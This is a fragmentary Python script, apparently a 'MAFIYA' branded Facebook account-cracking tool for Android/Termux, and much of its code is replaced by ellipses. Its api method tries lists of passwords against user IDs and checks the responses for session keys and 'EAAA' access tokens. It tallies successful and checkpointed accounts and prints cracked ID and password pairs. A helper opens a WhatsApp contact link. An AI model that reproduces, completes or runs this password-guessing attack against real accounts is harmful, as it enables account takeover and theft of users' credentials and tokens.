...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://wa.me/+91997945685"])
...
==================================================
           ...
           FB PAGE  : MAFIYA JUNTER   
==================================================           
\x1b[0;91m\x1b[1;43m                  M4FIY4 TH3 BR4ND :)                 \x1b[0m""")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [THE MAFIYA] : %s/%s -> \033[0;92m [ MAFIYA-OK:%s ]- \033[0;94m[MAFIYA-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;94m[MAFIYA-CP] %s|%s\033[0;97m         "%(uid, pw))
